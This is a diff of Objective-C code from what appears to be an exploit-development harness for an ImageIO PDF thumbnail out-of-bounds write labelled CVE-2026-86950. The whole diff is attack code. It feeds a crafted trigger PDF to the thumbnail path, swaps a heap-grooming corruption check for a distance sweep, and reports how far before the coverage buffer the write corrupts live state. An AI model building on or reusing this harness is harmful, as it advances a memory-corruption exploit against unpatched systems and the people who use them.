@@ -162,40 +162,23 @@ static int ModSweepDistance(void) {
 }
 
 NSString *ModCVE86950(void) {
+    // The raster-size sweep and the groom only repeat what we already know (the
+    // trigger kills the process on the first render), and they burn the whole
+    // run before the distance sweep is ever reached.  Order that gets an answer:
+    //   control -> distance sweep (R86950_START=<index> to jump to any distance).
     AveLog(@"    CVE-2026-86950: ImageIO PDF thumbnail OOB (fixed only in 26.7.1)");
     AvePost(@"86950 start");
 
-    // control first: a plain page with no font must thumbnail cleanly
     NSString *ctl = ModThumbPDF(@"control_86950.pdf", @"86950-CTL", 256);
     AvePost([NSString stringWithFormat:@"86950CTL %@", ctl]);
     if (![ctl containsString:@"OK"] && ![ctl containsString:@"NULL"]) {
         AvePost(@"86950 verdict: CONTROL failed — the thumbnail path is broken, not the bug");
         return [NSString stringWithFormat:@"86950: CONTROL failed (%@)", ctl];
     }
-
-    // the trigger: the verified-geometry font at Tf=1024, at increasing raster
-    // sizes (bigger raster = wider coverage buffer = different OOB distance).
-    int sizes[] = { 32, 64, 128, 256, 512, 1024 };
-    for (int i = 0; i < 6; i++) {
-        NSString *r = ModThumbPDF(@"trigger_86950.pdf",
-                                  [NSString stringWithFormat:@"86950-T%d", sizes[i]],
-                                  sizes[i]);
-        AvePost([NSString stringWithFormat:@"86950 %@", r]);
-        if (![r containsString:@"OK"] && ![r containsString:@"NULL"]) break;
-    }
-
-    AvePost(@"86950 done: the thumbnail path survived at every raster size");
-    (void)ModSweepDistance();
-    // pure-crash sweep is done; now the corruption oracle: with the heap
-    // pre-filled with tagged regions, a write that lands inside them changes the
-    // tag even if the process survives.
-    int corrupt = ModGroomScan(64, 8 << 20, @"trigger_86950.pdf", 32);
-    if (corrupt) {
-        AvePost(@"86950 verdict: HEAP CORRUPTION CONFIRMED (no crash needed)");
-        return [NSString stringWithFormat:@"86950: HEAP CORRUPTION CONFIRMED (%d words in "
-                @"our tagged regions)", corrupt];
-    }
-    AvePost(@"86950 verdict: no corruption seen in the tagged regions this run");
-    return @"86950: crash oracle fired; groom scan found no changed words (groom density "
-            @"or distance is next)";
+    int d = ModSweepDistance();
+    if (d > 0)
+        return [NSString stringWithFormat:@"86950: the OOB write reached live state at "
+                @"distance %d bytes before the coverage buffer (R86950_START to continue)", d];
+    AvePost(@"86950 verdict: no distance produced a fault");
+    return @"86950: distance sweep completed without a fault";
 }
